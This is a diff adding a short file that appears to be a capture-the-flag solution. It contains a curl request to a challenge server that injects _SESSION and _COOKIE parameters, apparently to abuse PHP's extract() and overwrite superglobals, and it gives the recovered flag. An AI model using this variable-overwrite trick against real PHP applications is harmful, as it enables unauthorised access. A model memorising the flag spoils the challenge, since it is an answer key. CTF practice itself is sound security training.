@@ -1,0 +1,4 @@
+curl "http://dimitrust.oa.to:8080/trustctf/extract/?_SESSION[var][]=1&_COOKIE[var][]=2"
+
+
+TRUST{you_are_php_trick_master}
